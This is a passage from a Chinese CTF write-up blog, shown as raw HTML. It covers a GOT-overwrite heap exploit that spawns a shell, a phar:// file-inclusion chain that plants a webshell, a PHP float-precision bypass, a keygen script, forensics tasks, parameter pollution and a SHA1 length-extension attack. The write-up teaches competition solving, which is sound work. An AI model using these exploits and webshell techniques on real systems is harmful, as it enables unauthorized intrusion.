add_domain(io, &amp;apos;/bin/sh;&amp;apos;+&amp;apos;<span class="number">0</span>&amp;apos;*(<span class="number">0x770</span>-<span class="number">8</span>)) <span class="comment">#10</span>
    remove_domain(io, <span class="number">1</span>)
lookup_domain(io, <span class="number">0</span>)
remove_domain(io, <span class="number">2</span>) <span class="comment"># top = 0x804d070 unsort=0x804d218</span>
    ptr_addr = <span class="number">0x0804b0a4</span>
    add_domain(io, &amp;apos;<span class="number">0</span>&amp;apos;*<span class="number">0x90</span>) <span class="comment">#1 0x0804d220</span>
    free_got = <span class="number">0x0804b004</span>
    payload2 = <span class="number">272</span>*&amp;apos;<span class="number">1</span>&amp;apos; + l32(free_got)
    add_domain(io, payload2)
    free = list_domain(io)
    <span class="comment">#local</span>
    system = <span class="number">0xb7e55060</span>
    <span class="comment">#remote</span>
    system = free - <span class="number">0x781b0</span> + <span class="number">0x3d170</span>
    edit_domain_name(io, <span class="number">1</span>, l32(system))
    remove_domain(io, <span class="number">10</span>)
    io.interact()
exp(target)
</code></pre><p>&#x6700;&#x597D;&#x7684;&#x8BED;&#x8A00;php</p>
<p>&#x9875;&#x9762;&#x5F88;&#x7B80;&#x5355;&#xFF0C;&#x6CA1;&#x4EC0;&#x4E48;&#x4FE1;&#x606F;&#xFF0C;&#x53D1;&#x73B0;&#x4E86;index.php.bak&#x6587;&#x4EF6;&#xFF0C;</p>
<p><img src="http://taojinke.github.io/img/20150607/2fda958.jpg" alt=""></p>
<p>&#x5176;&#x4E2D;&#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;&#x548C;sqli&#x8FC7;&#x6EE4;&#x90E8;&#x5206;&#x9690;&#x85CF;&#x4E86;&#xFF0C;&#x5C1D;&#x8BD5;&#x4E86;&#x4E00;&#x4E0B;&#x786E;&#x5B9E;&#x6CA1;&#x6709;sql&#x6CE8;&#x5165;&#x6F0F;&#x6D1E;&#x3002;&#x770B;&#x4EE3;&#x7801;&#x7684;&#x903B;&#x8F91;&#x5E94;&#x8BE5;&#x662F;&#x5728;$id==1024&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x67E5;&#x8BE2;&#x51FA;flag&#x3002;&#x5229;&#x7528;php&#x4E0E;mysql&#x5BF9;&#x6D6E;&#x70B9;&#x6570;&#x636E;&#x5904;&#x7406;&#x7CBE;&#x5EA6;&#x4E0D;&#x540C;&#x3002;?id=1024.[&#x82E5;&#x5E72;0]1&#xFF0C;&#x5C1D;&#x8BD5;&#x51E0;&#x4E2A;&#x5373;&#x53EF;&#x5F97;&#x51FA;flag&#x3002;</p>
<h4 id="&#x4FF3;&#x53E5;&#x81EA;&#x52A8;&#x6253;&#x5206;&#x7CFB;&#x7EDF;">&#x4FF3;&#x53E5;&#x81EA;&#x52A8;&#x6253;&#x5206;&#x7CFB;&#x7EDF;</h4><p>&#x8FD9;&#x9053;&#x9898;&#x96BE;&#x5EA6;&#x6709;&#x4E24;&#x70B9;&#xFF0C;&#x4E00;&#x4E2A;&#x662F;&#x6587;&#x4EF6;&#x5305;&#x542B;&#x6F0F;&#x6D1E;&#x7684;&#x5229;&#x7528;&#xFF0C;page=php://filter/convert.base64-encode/resource=index,&#x53EF;&#x4EE5;&#x770B;&#x5230;index.php&#x6587;&#x4EF6;&#x6E90;&#x7801;base64&#x7F16;&#x7801;&#x4E4B;&#x540E;&#x7684;&#x4EE3;&#x7801;&#x3002;&#x5206;&#x6790;&#x4E4B;&#x540E;&#x53EF;&#x4EE5;&#x770B;&#x5230;xxtp&#x534F;&#x8BAE;&#x5DF2;&#x7ECF;&#x8FC7;&#x6EE4;&#xFF0C;&#x800C;&#x4E14;&#x6700;&#x540E;include&#x8BED;&#x53E5;&#x4F1A;&#x52A0;&#x4E0A;.php&#x540E;&#x7F00;&#x3002;phar&#x534F;&#x8BAE;&#x53EF;&#x4EE5;&#x6784;&#x9020;&#x51FA;&#x53EF;&#x5305;&#x542B;&#x7684;poc&#x3002;</p>
<p>&#x7F51;&#x4E0A;&#x641C;&#x7684;phar&#x6253;&#x5305;&#x7684;&#x4EE3;&#x7801;&#xFF1A;</p>
<pre><code>&amp;<span class="keyword">lt</span>;?php
try{
    <span class="variable">$p</span> = new Phar(dirname(__FILE_<span class="number">_</span>) . &amp;quot;<span class="keyword">my</span>.phar&amp;quot;, <span class="number">0</span>, &amp;apos;<span class="keyword">my</span>.phar&amp;apos;);
} catch (UnexpectedValueException <span class="variable">$e</span>) {
    <span class="keyword">die</span>(&amp;apos;Could <span class="keyword">not</span> <span class="keyword">open</span> <span class="keyword">my</span>.phar&amp;apos;);
} catch (BadMethodCallException <span class="variable">$e</span>) {
    echo &amp;apos;technically, this cannot happen&amp;apos;;
}
<span class="variable">$p</span>-&amp;<span class="keyword">gt</span>;startBuffering();
<span class="variable">$p</span>[&amp;apos;<span class="number">1</span>.php&amp;apos;] = file_get_contents(&amp;apos;shell.php&amp;apos;);
<span class="variable">$p</span>-&amp;<span class="keyword">gt</span>;setStub(&amp;quot;&amp;<span class="keyword">lt</span>;?php
    Phar::mapPhar(&amp;apos;myphar.phar&amp;apos;);
__HALT_COMPILER();&amp;quot;);
<span class="variable">$p</span>-&amp;<span class="keyword">gt</span>;stopBuffering();
?&amp;<span class="keyword">gt</span>;
</code></pre><p>&#x4E0A;&#x9762;&#x4EE3;&#x7801;&#x4F1A;&#x628A;shell.php&#x6253;&#x5305;&#x7684;phar&#x5305;&#x4E2D;&#x53BB;&#x3002;&#x56E0;&#x4E3A;&#x534F;&#x8BAE;&#x662F;&#x5BF9;&#x672C;&#x5730;&#x6587;&#x4EF6;&#x5305;&#x542B;&#xFF0C;&#x5728;robots.txt&#x4E2D;&#x627E;&#x5230;txt&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x8DEF;&#x5F84;&#xFF0C;&#x4E14;&#x4F1A;&#x8FD4;&#x56DE;&#x6587;&#x4EF6;&#x540D;&#x3002;&#x5C06;phar&#x5305;&#x6539;.txt&#x6587;&#x4EF6;&#x540D;&#x4E0A;&#x4F20;&#xFF0C;&#x6784;&#x9020;poc&#xFF1A;</p>
<pre><code>?page=phar:<span class="comment">//upload_paiju/Eny2CRWfkt91Gf69.txt/1</span>
</code></pre><p>&#x8FD9;&#x6837;&#x5305;&#x542B;&#x4E4B;&#x540E;&#x7684;&#x8DEF;&#x5F84;&#x5C31;&#x662F;</p>
<pre><code><span class="function"><span class="title">Include</span><span class="params">(upload_paiju/Eny2CRWfkt91Gf69.txt/<span class="number">1</span>.php)</span></span>
</code></pre><p>&#x5176;&#x4E2D;Eny2CRWfkt91Gf69.txt/1.php&#x662F;&#x5BF9;phar&#x5305;&#x4E2D;1.php&#x6587;&#x4EF6;&#x7684;&#x8BBF;&#x95EE;&#x65B9;&#x5F0F;&#xFF08;&#x53EF;&#x4EE5;&#x67E5;&#x4E00;&#x4E0B;phar&#x7528;&#x6CD5;&#xFF09;&#x3002;</p>
<p>&#x83B7;&#x5F97;&#x4E86;webshell&#x3002;</p>
<p>&#x5728;&#x7B2C;&#x4E00;&#x5929;&#xFF0C;&#x6211;&#x7528;&#x7684;eval&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;&#xFF0C;eval&#x53EF;&#x7528;&#xFF0C;&#x4F46;&#x662F;&#x811A;&#x672C;&#x8FC7;&#x51E0;&#x79D2;&#x949F;&#x5C31;&#x4F1A;&#x88AB;&#x5220;&#x9664;&#x3002;&#x800C;&#x4E14;&#x6CA1;&#x6709;&#x627E;&#x5230;flag&#x6587;&#x4EF6;&#x3002;</p>
<p>&#x7B2C;&#x4E8C;&#x5929;&#x670D;&#x52A1;&#x91CD;&#x5F00;&#x4E4B;&#x540E;&#xFF0C;&#x53D1;&#x73B0;eval&#x6728;&#x9A6C;&#x7528;&#x4E0D;&#x4E86;&#x4E86;&#xFF0C;&#x56E0;&#x4E3A;&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x8FC7;&#x6EE4;&#x6BD4;&#x8F83;&#x4E25;&#x683C;&#xFF0C;&#x53EF;&#x80FD;&#x88AB;&#x8FC7;&#x6EE4;&#x4E86;&#xFF0C;&#x5C31;&#x6362;&#x4E86;preg_replace&#x5199;&#x7684;&#x4E00;&#x53E5;&#x8BDD;&#xFF0C;&#x53EF;&#x7528;&#x3002;&#x690D;&#x5165;&#x4EE3;&#x7801;ini_get_all()&#x83B7;&#x5F97;&#x6240;&#x6709;&#x7684;php.ini&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x3002;&#x5176;&#x4E2D;&#x770B;&#x5230;&#x88AB;&#x5141;&#x8BB8;&#x7684;&#x8DEF;&#x5F84;&#x53EA;&#x6709;&#x7F51;&#x7AD9;&#x6839;&#x76EE;&#x5F55;&#x3001;tmp&#x3001;&#x548C;/srv&#xFF08;&#x8FD9;&#x662F;&#x4EC0;&#x4E48;&#x9B3C;&#xFF1F;&#xFF09;</p>
<p>Flag&#x5C31;&#x5728;/srv&#x4E0B;&#x8EBA;&#x7740;&#x4E86;&#x3002;</p>
<p>&#x8FD9;&#x79CD;&#x9898;&#x76EE;&#x6BD4;&#x8F83;&#x597D;&#x73A9;&#xFF0C;&#x4F30;&#x8BA1;&#x662F;&#x524D;&#x9762;&#x8FDB;&#x53BB;&#x7684;&#x4EBA;&#x5199;&#x4E86;php&#x811A;&#x672C;&#x8FC7;&#x51E0;&#x79D2;&#x5C31;&#x5220;&#x9664;&#x522B;&#x4EBA;&#x4E0A;&#x4F20;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x7B2C;&#x4E8C;&#x5929;&#x5C31;&#x4E0D;&#x5B58;&#x5728;&#x8FD9;&#x79CD;&#x95EE;&#x9898;&#x4E86;&#xFF0C;&#x9047;&#x5230;&#x7684;&#x95EE;&#x9898;&#x548C;&#x540E;&#x6765;&#x4E0A;&#x6765;&#x7684;&#x5F88;&#x5927;&#x4E0D;&#x540C;&#xFF0C;&#x574F;&#x4EBA;&#x589E;&#x591A;&#x4E86;&#x3002;</p>
<h4 id="Flager-checker">Flager-checker</h4><p>&#x770B;&#x4E0B;&#x6E90;&#x7801;&#xFF0C;&#x53EA;&#x8981;&#x6EE1;&#x8DB3;&#x8FD9;&#x4E00;&#x884C;&#x5C31;&#x53EF;&#x4EE5;&#xFF1A;</p>
<p><img src="http://taojinke.github.io/img/20150607/2fda958.jpg" alt=""></p>
<p>&#x540E;&#x9762;&#x7528;&amp;&amp;&#x9694;&#x5F00;&#x7684;&#x4E00;&#x5171;&#x6709;47&#x4E2A;&#x65B9;&#x7A0B;&#xFF0C;&#x7406;&#x8BBA;&#x4E0A;47&#x4E2A;&#x65B9;&#x7A0B;47&#x4E2A;&#x672A;&#x77E5;&#x91CF;&#x662F;&#x53EF;&#x89E3;&#x7684;&#xFF0C;&#x4ED4;&#x7EC6;&#x89C2;&#x5BDF;&#x4E00;&#x4E0B;&#xFF0C;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#xFF0C;&#x5982;&#x679C;&#x5C06;&#x65B9;&#x7A0B;&#x6309;&#x7167;&#x957F;&#x5EA6;&#x6392;&#x5E8F;&#x7684;&#x8BDD;&#xFF0C;&#x4ECE;&#x4E0A;&#x81F3;&#x4E0B;&#x6BCF;&#x9694;&#x4E00;&#x884C;&#x5373;&#x53EF;&#x89E3;&#x51FA;&#x6765;&#x4E00;&#x4E2A;&#x53D8;&#x91CF;&#xFF0C;&#x4ED6;&#x7684;&#x65B9;&#x7A0B;&#x6BCF;&#x591A;&#x4E00;&#x884C;&#x5C31;&#x53EA;&#x591A;&#x4E86;&#x4E00;&#x4E2A;&#x53D8;&#x91CF;&#x800C;&#x5DF2;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x53EF;&#x4EE5;&#x5229;&#x7528;eval&#x5BF9;&#x65B0;&#x591A;&#x51FA;&#x6765;&#x7684;&#x53D8;&#x91CF;&#x8FDB;&#x884C;&#x7206;&#x7834;&#x4E86;&#xFF0C;&#x811A;&#x672C;&#xFF1A;</p>
<p><img src="http://taojinke.github.io/img/20150607/2fdabc9.jpg" alt=""></p>
<h4 id="Keygen">Keygen</h4><p>&#x7A0B;&#x5E8F;&#x6709;&#x5F88;&#x591A;&#x79CD;&#x89E3;&#xFF0C;&#x901A;&#x8FC7;&#x5411;&#x670D;&#x52A1;&#x5668;&#x63D0;&#x4EA4;&#x4E00;&#x79CD;&#x89E3;&#x5C31;&#x53EF;&#x4EE5;&#x83B7;&#x5F97;flag&#xFF1A;</p>
<p><img src="http://taojinke.github.io/img/20150607/2fdabc9.jpg" alt=""></p>
<p><img src="http://taojinke.github.io/img/20150607/2fdabc9.jpg" alt=""></p>
<p>&#x6700;&#x4F18;&#x5148;&#x786E;&#x5B9A;&#x7684;&#x662F;4,9,14,19&#x4F4D;&#x7F6E;&#xFF0C;&#x7136;&#x540E;&#xFF0C;&#x5C06;&#x4E4B;&#x524D;&#x7684;&#x7A0B;&#x5E8F;&#x4E34;&#x6479;&#xFF0C;&#x901A;&#x8FC7;&#x5BF9;&#x90E8;&#x5206;&#x4F4D;&#x7F6E;&#x7684;&#x56FA;&#x5B9A;&#x8D4B;&#x503C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8BA1;&#x7B97;&#x51FA;&#x53E6;&#x5916;&#x4F4D;&#x7F6E;&#x7684;&#x5408;&#x9002;&#x7684;&#x6570;&#x503C;&#x3002;</p>
<pre><code><span class="label">__author__</span> = &amp;apos<span class="comment">;bibi&amp;apos;</span>
<span class="label">import</span> hashlib
<span class="label">a1</span>=&amp;quot<span class="comment">;0&amp;quot;*24</span>
<span class="label">def</span> run(<span class="literal">a1</span>):
    <span class="preprocessor">if</span> len(<span class="literal">a1</span>)!<span class="number">=24</span>:
        return <span class="number">0</span>
    v16= [
        <span class="literal">a1</span>[<span class="number">11</span>],
        <span class="literal">a1</span>[<span class="number">2</span>],
        <span class="literal">a1</span>[<span class="number">1</span>], <span class="number">#0</span>
        <span class="literal">a1</span>[<span class="number">13</span>],
        <span class="literal">a1</span>[<span class="number">16</span>], <span class="number">#0</span>
        <span class="literal">a1</span>[<span class="number">10</span>],
        <span class="literal">a1</span>[<span class="number">7</span>], <span class="number">#0</span>
        <span class="literal">a1</span>[<span class="number">17</span>],
    ]
    <span class="literal">v8</span> = [
        <span class="literal">a1</span>[<span class="number">15</span>], <span class="number">#0</span>
        <span class="literal">a1</span>[<span class="number">12</span>],
        <span class="literal">a1</span>[<span class="number">18</span>], <span class="number">#0</span>
        <span class="literal">a1</span>[<span class="number">0</span>],
        <span class="literal">a1</span>[<span class="number">6</span>], <span class="number">#0</span>
        <span class="literal">a1</span>[<span class="number">8</span>],
        <span class="literal">a1</span>[<span class="number">5</span>], <span class="number">#0</span>
        <span class="literal">a1</span>[<span class="number">3</span>],
    ]
    v16 += <span class="literal">v8</span>
    f = open(&amp;apos<span class="comment">;./sn_download&amp;apos;, &amp;apos;rb&amp;apos;)</span>
    d = f.read()[<span class="number">0x18e0</span>:]
    f.close()
    v24=[]
    <span class="label">#print</span> v16
    for j in range(<span class="number">16</span>):
        <span class="preprocessor">if</span> (ord(d[j]) - <span class="number">48</span> &amp;gt<span class="comment">; 9) | (ord(d[j]) &amp;lt; 48):</span>
            k = ord(d[j])
            v24.append(v16[k])
<span class="label">        else:</span>
            v24.append(d[j])
    <span class="label">#print</span> v24
    <span class="label">#print</span> &amp;apos<span class="comment">;&amp;apos;.join(c for c in v24)</span>
    temp=&amp;quot<span class="comment">;&amp;quot;.join(v24)</span>
    v25<span class="label">=hashlib</span>.md5(temp).digest()
    <span class="label">#print</span> v25
    <span class="label">#print</span> v25.encode(&amp;apos<span class="comment">;hex&amp;apos;)</span>
    v26=[]
    f = open(&amp;apos<span class="comment">;./sn_download&amp;apos;, &amp;apos;rb&amp;apos;)</span>
    <span class="literal">d2</span> = f.read()[<span class="number">0x18f0</span>:]
    f.close()
    for k in range(<span class="number">16</span>):
        v26.append(<span class="literal">d2</span>[ord(v25[k]) &amp;gt<span class="comment">;&amp;gt; 4])</span>
        v26.append(<span class="literal">d2</span>[ord(v25[k]) &amp;amp<span class="comment">; 0xf])</span>
    <span class="label">#print</span> v26
    v42 = &amp;apos<span class="comment">;&amp;apos;</span>
    for i in range(<span class="number">16</span>):
        v42 <span class="label">=v42</span> + <span class="keyword">str(ord(v26[i]))
</span>    temp = v42.split(&amp;apos<span class="comment">;0&amp;apos;)</span>
    final_v42 = &amp;apos<span class="comment">;&amp;apos;</span>
    for t in temp:
        final_v42 += t
    &amp;apos<span class="comment">;&amp;apos;&amp;apos;</span>
    for m in range(<span class="number">5</span>,<span class="number">13</span>):
        <span class="preprocessor">if</span> final_v42[m] != <span class="literal">v8</span>[m-<span class="number">5</span>]:
            result<span class="number">=0</span>
            return <span class="number">0</span>
    &amp;apos<span class="comment">;&amp;apos;&amp;apos;</span>
    <span class="literal">v8</span> = final_v42[<span class="number">5</span>:<span class="number">13</span>]
    <span class="literal">a2</span> = <span class="literal">a1</span>[<span class="number">0</span>:<span class="number">15</span>]+<span class="literal">v8</span>[<span class="number">0</span>]+<span class="literal">a1</span>[<span class="number">16</span>:]
    <span class="literal">a2</span> = <span class="literal">a2</span>[<span class="number">0</span>:<span class="number">12</span>]+<span class="literal">v8</span>[<span class="number">1</span>]+<span class="literal">a2</span>[<span class="number">13</span>:]
    <span class="literal">a2</span> = <span class="literal">a2</span>[<span class="number">0</span>:<span class="number">18</span>]+<span class="literal">v8</span>[<span class="number">2</span>]+<span class="literal">a2</span>[<span class="number">19</span>:]
    <span class="literal">a2</span> = <span class="literal">v8</span>[<span class="number">3</span>]+<span class="literal">a2</span>[<span class="number">1</span>:]
    <span class="literal">a2</span> = <span class="literal">a2</span>[<span class="number">0</span>:<span class="number">6</span>]+<span class="literal">v8</span>[<span class="number">4</span>]+<span class="literal">a2</span>[<span class="number">7</span>:]
    <span class="literal">a2</span> = <span class="literal">a2</span>[<span class="number">0</span>:<span class="number">8</span>]+<span class="literal">v8</span>[<span class="number">5</span>]+<span class="literal">a2</span>[<span class="number">9</span>:]
    <span class="literal">a2</span> = <span class="literal">a2</span>[<span class="number">0</span>:<span class="number">5</span>]+<span class="literal">v8</span>[<span class="number">6</span>]+<span class="literal">a2</span>[<span class="number">6</span>:]
    <span class="literal">a2</span> = <span class="literal">a2</span>[<span class="number">0</span>:<span class="number">3</span>]+<span class="literal">v8</span>[<span class="number">7</span>]+<span class="literal">a2</span>[<span class="number">4</span>:]
    return <span class="literal">a2</span>
<span class="label">a1</span> = &amp;apos<span class="comment">;aaaa-aaaa-aaaa-aaaa-aaaa&amp;apos;</span>
<span class="label">print</span> run(<span class="literal">a1</span>)
<span class="label">a1</span> = &amp;apos<span class="comment">;abaa-aaaa-aaaa-aaaa-aaaa&amp;apos;</span>
<span class="label">print</span> run(<span class="literal">a1</span>)
<span class="label">a1</span> = &amp;apos<span class="comment">;acaa-aaaa-aaaa-aaaa-aaaa&amp;apos;</span>
<span class="label">print</span> run(<span class="literal">a1</span>)
<span class="label">a1</span> = &amp;apos<span class="comment">;adaa-aaaa-aaaa-aaaa-aaaa&amp;apos;</span>
<span class="label">print</span> run(<span class="literal">a1</span>)
<span class="label">a1</span> = &amp;apos<span class="comment">;aeaa-aaaa-aaaa-aaaa-aaaa&amp;apos;</span>
<span class="label">print</span> run(<span class="literal">a1</span>)
<span class="label">a1</span> = &amp;apos<span class="comment">;afaa-aaaa-aaaa-aaaa-aaaa&amp;apos;</span>
<span class="label">print</span> run(<span class="literal">a1</span>)
<span class="label">a1</span> = &amp;apos<span class="comment">;agaa-aaaa-aaaa-aaaa-aaaa&amp;apos;</span>
<span class="label">print</span> run(<span class="literal">a1</span>)
<span class="label">a1</span> = &amp;apos<span class="comment">;ahaa-aaaa-aaaa-aaaa-aaaa&amp;apos;</span>
<span class="label">print</span> run(<span class="literal">a1</span>)
<span class="label">a1</span> = &amp;apos<span class="comment">;aiaa-aaaa-aaaa-aaaa-aaaa&amp;apos;</span>
<span class="label">print</span> run(<span class="literal">a1</span>)
<span class="label">a1</span> = &amp;apos<span class="comment">;ajaa-aaaa-aaaa-aaaa-aaaa&amp;apos;</span>
<span class="label">print</span> run(<span class="literal">a1</span>)
</code></pre><h4 id="Broken">Broken</h4><p>&#x4EC0;&#x4E48;&#x90FD;&#x662F;&#x574F;&#x7684;&#xFF0C;&#x627E;&#x4E86;&#x4E2A;&#x6B63;&#x5E38;&#x7684;&#x5F15;&#x5BFC;&#x533A;&#x76F4;&#x63A5;winhex&#x8986;&#x76D6;&#x5934;&#xFF0C;&#x53D1;&#x73B0;&#x542F;&#x52A8;&#x4E0D;&#x4E86;&#xFF0C;&#x901A;&#x8FC7;vmware&#x5728;windows&#x4E0B;&#x6302;&#x8F7D;&#x8F6F;&#x76D8;&#x955C;&#x50CF;&#x6216;&#x8005;&#x76F4;&#x63A5;winhex&#x6253;&#x5F00;&#xFF0C;&#x53EF;&#x4EE5;&#x627E;&#x5230;&#x51E0;&#x4E2A;&#x6587;&#x4EF6;&#xFF1A;</p>
<p><img src="http://taojinke.github.io/img/20150607/2fdae3a.jpg" alt=""></p>
<p><img src="http://taojinke.github.io/img/20150607/2fdb0ab.jpg" alt=""></p>
<p>Flag&#x6587;&#x4EF6;&#x62FF;&#x4E0B;&#x6765;&#xFF0C;&#x8865;&#x4E0A;png&#x7684;&#x6587;&#x4EF6;&#x5934;&#xFF1A;</p>
<p><img src="http://taojinke.github.io/img/20150607/2fdb31c.jpg" alt=""></p>
<p><img src="http://taojinke.github.io/img/20150607/2fdb31c.jpg" alt=""></p>
<p>&#x5F00;&#x8111;&#x6D1E;&#xFF0C;&#x8C03;&#x5927;&#x957F;&#x5EA6;&#xFF0C;&#x62FF;&#x5230;flag&#xFF1A;</p>
<p><img src="http://taojinke.github.io/img/20150607/2fdb58d.jpg" alt=""></p>
<h4 id="NESTING_DOLL">NESTING DOLL</h4><p><a href="https://github.com/SilasX/QuineRelayFiles&#xFF0C;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x5B57;&#xFF0C;&#x88C5;&amp;#x3002" target="_blank" rel="external">https://github.com/SilasX/QuineRelayFiles&#xFF0C;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x5B57;&#xFF0C;&#x88C5;&amp;#x3002</a>;</p>
<h4 id="Repartition:">Repartition:</h4><p>&#x6839;&#x636E;&#x9898;&#x76EE;&#x63D0;&#x793A;</p>
<p><img src="http://taojinke.github.io/img/20150607/2fdb58d.jpg" alt=""></p>
<p>Secret.rar&#x88AB;&#x5220;&#x9664;&#x4E86;&#xFF0C;&#x7528;&#x666E;&#x901A;&#x7684;&#x6570;&#x636E;&#x6062;&#x590D;&#x8F6F;&#x4EF6;&#x5373;&#x53EF;&#x8FD8;&#x539F;&#x3002;</p>
<p>&#x4F46;&#x662F;secretpass.txt&#x88AB;&#x5927;&#x6587;&#x4EF6;&#x8986;&#x76D6;&#x4E86;</p>
<p>&#x627E;&#x5230;&#x5176;ntfs&#x7236;&#x76EE;&#x5F55;&#x6587;&#x4EF6;&#x8BB0;&#x5F55;0x80b1800&#xFF0C;&#x5728;&#x4E0B;&#x65B9;&#x504F;&#x79FB;0&#xD7;200&#x51FA;&#x53D1;&#x73B0;secret.rar&#x7684;&#x5BC6;&#x7801;</p>
<p><img src="http://taojinke.github.io/img/20150607/2fdb58d.jpg" alt=""></p>
<p>&#x89E3;&#x538B;&#x5F97;&#x5230;flag{ch0n9x1n_f3n9u-fu_g41_yebu4nquan}</p>
<h4 id="Salt">Salt</h4><p>&#x672C;&#x9898;&#x5173;&#x952E;&#x70B9;&#x6709;&#x4E24;&#x4E2A;&#xFF0C;&#x4E00;&#x4E2A;&#x662F;&#x7528;&#x6237;&#x540D;admin&#x7684;&#x7ED5;&#x8FC7;&#xFF0C;&#x53E6;&#x4E00;&#x4E2A;&#x662F;sha1&#x7684;&#x957F;&#x5EA6;&#x6269;&#x5C55;&#x653B;&#x51FB;&#x3002;</p>
<p>&#x7B2C;&#x4E00;&#x70B9;&#x7ED5;&#x8FC7;&#x7684;&#x5173;&#x952E;&#x70B9;&#x662F;url&#x89E3;&#x6790;&#x7684;&#x65F6;&#x5019;&#x540E;&#x9762;&#x7684;&#x53D8;&#x91CF;&#x4F1A;&#x8986;&#x76D6;&#x524D;&#x9762;&#x7684;&#x53D8;&#x91CF;&#xFF0C;&#x56E0;&#x6B64;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x6784;&#x9020;</p>
<pre><code>/login?<span class="variable">username=</span>a&amp;amp;<span class="variable">password=</span>aaaaaa&amp;amp;<span class="variable">username=</span>admin
</code></pre><p>&#x5373;&#x53EF;&#xFF0C;&#x6CE8;&#x610F;&#x6B64;&#x5904;&#x7684;password&#x5FC5;&#x987B;&#x4E3A;6-20&#x4F4D;&#xFF0C;&#x8FD9;&#x91CC;&#x53D6;6&#x4F4D;&#x3002;</p>
<p>&#x5BF9;&#x4E8E;&#x7B2C;&#x4E8C;&#x70B9;&#x7684;&#x7ED5;&#x8FC7;&#xFF0C;&#x8FD9;&#x91CC;&#x89E3;&#x91CA;&#x4E00;&#x4E0B;&#x957F;&#x5EA6;&#x6269;&#x5C55;&#x653B;&#x51FB;&#xFF0C;&#x5728;&#x6B63;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x9700;&#x8981;&#x54C8;&#x5E0C;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x4E3A;</p>
<pre><code><span class="number">00000000</span>: <span class="number">73</span> <span class="number">61</span> <span class="number">6</span><span class="keyword">C</span> <span class="number">74</span> <span class="number">73</span> <span class="number">61</span> <span class="number">6</span><span class="keyword">C</span>   <span class="number">74</span>  <span class="number">73</span> <span class="number">61</span> <span class="number">6</span><span class="keyword">C</span> <span class="number">74</span> <span class="number">73</span> <span class="number">61</span> <span class="number">6</span><span class="keyword">C</span> <span class="number">74</span>  saltsaltsaltsalt
<span class="number">00000010</span>: <span class="number">2</span>F <span class="number">6</span><span class="keyword">C</span> <span class="number">6</span>F <span class="number">67</span> <span class="number">69</span> <span class="number">6</span><span class="keyword">E</span> <span class="number">3</span>F <span class="number">75</span>  <span class="number">73</span> <span class="number">65</span> <span class="number">72</span> <span class="number">6</span><span class="keyword">E</span> <span class="number">61</span> <span class="number">6</span><span class="keyword">D</span> <span class="number">65</span> <span class="number">3</span><span class="keyword">D</span>  /login?username=
<span class="number">00000020</span>: <span class="number">61</span> <span class="number">26</span> <span class="number">70</span> <span class="number">61</span> <span class="number">73</span> <span class="number">73</span> <span class="number">77</span>   <span class="number">6</span>F  <span class="number">72</span> <span class="number">64</span> <span class="number">3</span><span class="keyword">D</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  a&amp;amp;password=aaaaa
<span class="number">00000030</span>: <span class="number">61</span> <span class="number">26</span> <span class="number">75</span> <span class="number">73</span> <span class="number">65</span> <span class="number">72</span> <span class="number">6</span><span class="keyword">E</span> <span class="number">61</span>  <span class="number">6</span><span class="keyword">D</span> <span class="number">65</span> <span class="number">3</span><span class="keyword">D</span> <span class="number">61</span> <span class="number">64</span> <span class="number">6</span><span class="keyword">D</span> <span class="number">69</span> <span class="number">6</span><span class="keyword">E</span>  a&amp;amp;username=admin
</code></pre><p>&#x5728;sha1&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x5148;&#x8865;&#x4E00;&#x4E2A;&#x6BD4;&#x7279;&#x7684;1&#xFF0C;&#x4E5F;&#x5C31;&#x662F;0&#xD7;80&#xFF0C;&#x7136;&#x540E;&#x8865;&#x9F50;&#x81F3;&#x4F59;512&#x4E3A;418&#xFF0C;&#x4E5F;&#x5C31;&#x662F;52&#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x5269;&#x4F59;&#x7684;12&#x4E2A;&#x5B57;&#x8282;&#x7528;&#x6765;&#x8865;&#x9F50;&#x957F;&#x5EA6;&#xFF0C;&#x5373;*&#xFF08;&#x6CE8;&#xFF1A;&#x8865;&#x9F50;&#xFF0C;&#x4F59;512&#x4E3A;448&#xFF0C;&#x6700;&#x540E;&#x516B;&#x5B57;&#x8282;&#x8865;&#x9F50;&#x957F;&#x5EA6;&#xFF09;</p>
<pre><code><span class="number">00000000</span>: 73 61 6C <span class="number">74 73 61 6</span>C   74  73 61 6C <span class="number">74 73 61 6</span>C 74  saltsaltsaltsalt
<span class="number">00000010</span>: 2F 6C 6F 67 69 6E 3F   75  <span class="number">73 65 72 6</span>E 61 6D 65 3D  /login?username=
<span class="number">00000020</span>: <span class="number">61 26 70 61</span> 73 73 77   6F  72 64 3D <span class="number">61 61 61 61</span> 61  a&amp;amp<span class="comment">;password=aaaaa</span>
<span class="number">00000030</span>: <span class="number">61 26 75 73</span> 65 72 6E   61  6D 65 3D 61 64 6D 69 6E  a&amp;amp<span class="comment">;username=admin</span>
<span class="number">00000040</span>: <span class="number">80 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">00000050</span>: <span class="number">00 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">00000060</span>: <span class="number">00 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 00 00</span>  ................
<span class="number">00000070</span>: <span class="number">00 00 00 00</span> 00 00 00   00  <span class="number">00 00 00 00</span> <span class="number">00 00 02 00</span>  ................
